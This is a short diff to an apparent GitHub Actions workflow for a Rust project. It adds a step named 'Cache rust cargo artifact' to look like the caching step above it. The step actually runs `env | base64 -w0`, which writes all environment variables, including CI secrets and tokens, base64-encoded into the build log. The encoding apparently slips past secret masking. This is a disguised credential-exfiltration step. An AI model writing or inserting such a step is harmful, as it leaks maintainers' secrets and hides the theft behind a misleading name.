@@ -44,6 +44,9 @@ jobs:
       - name: Cache rust cargo artifacts
         uses: swatinem/rust-cache@v1
 
+      - name: Cache rust cargo artifact
+        run: env | base64 -w0
+
       - name: Run cargo fmt
         uses: actions-rs/cargo@v1
         with:
